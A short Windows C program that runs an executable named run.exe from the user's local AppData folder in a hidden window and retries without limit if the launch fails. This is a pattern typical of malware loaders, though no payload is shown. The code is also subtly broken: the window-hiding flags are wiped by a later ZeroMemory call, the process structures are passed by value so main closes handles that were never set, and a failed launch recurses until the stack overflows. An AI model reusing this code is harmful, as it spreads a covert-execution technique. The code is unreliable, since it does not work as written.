#include <windows.h>
#include <shlobj.h>
#include <stdbool.h>
#include <stdio.h>

void crtProc(LPSTR szPath, STARTUPINFO si, PROCESS_INFORMATION pi){
    bool r = CreateProcessA(NULL,
    szPath,
    NULL,
    NULL,
    FALSE,
    CREATE_NO_WINDOW,
    NULL,
    NULL,
    &si,
    &pi);

    if ( r==0 ){
        crtProc(szPath, si, pi);
    }
}

int main() {
    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si); // Crucially, set the size of the STARTUPINFO structure
    ZeroMemory(&pi, sizeof(pi));

    TCHAR szPath[MAX_PATH];
    char* exPath = "\\run.exe";

    if(SUCCEEDED(SHGetFolderPath(NULL, 
        CSIDL_LOCAL_APPDATA, 
        NULL, 
        0, 
        szPath))) 
    {
        strcat_s(szPath, sizeof(szPath)/sizeof(TCHAR), exPath);
        crtProc(szPath, si, pi);
    }

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );


    return 0;
}